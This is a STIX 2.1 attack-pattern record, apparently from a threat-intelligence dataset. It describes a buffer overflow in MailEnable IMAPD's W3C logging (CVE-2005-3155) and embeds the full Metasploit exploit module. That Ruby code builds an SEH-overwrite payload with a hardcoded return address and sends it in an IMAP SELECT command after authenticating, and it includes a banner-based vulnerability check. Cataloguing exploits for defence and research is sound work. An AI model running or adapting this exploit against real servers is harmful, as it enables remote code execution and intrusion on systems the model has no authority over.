{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e9e2a6a-4783-4eea-a07d-276e5192488e",
    "created": "2024-08-14T16:47:44.969219Z",
    "modified": "2024-08-14T16:47:44.969223Z",
    "name": "MailEnable IMAPD W3C Logging Buffer Overflow",
    "description": " This module exploits a buffer overflow in the W3C logging functionality of the MailEnable IMAPD service. Logging is not enabled by default and this exploit requires a valid username and password to exploit the flaw. MailEnable Professional version 1.6 and prior and MailEnable Enterprise version 1.1 and prior are affected. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/mailenable_w3c_select.rb",
            "external_id": "mailenable_w3c_select.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-3155"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Imap\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MailEnable IMAPD W3C Logging Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the W3C logging\n        functionality of the MailEnable IMAPD service. Logging is\n        not enabled by default and this exploit requires a valid\n        username and password to exploit the flaw. MailEnable\n        Professional version 1.6 and prior and MailEnable Enterprise\n        version 1.1 and prior are affected.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-3155'],\n          [ 'OSVDB', '19842'],\n          [ 'BID', '15006'],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['MailEnable 1.54 Pro Universal', { 'Ret' => 0x1001c019 } ] #MEAISP.DLL\n        ],\n      'DisclosureDate' => '2005-10-03',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    connect\n    disconnect\n\n    if (banner and banner =~ /MailEnable Service, Version: 0-1\\.54/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect_login\n\n    buf = rand_text_alphanumeric(6196, payload_badchars)\n    seh = generate_seh_payload(target.ret)\n    req = 'a01 SELECT ' + buf + seh + \"\\r\\n\"\n    sock.put(req)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-10-03",
    "x_mitre_platforms": [
        "win'"
    ]
}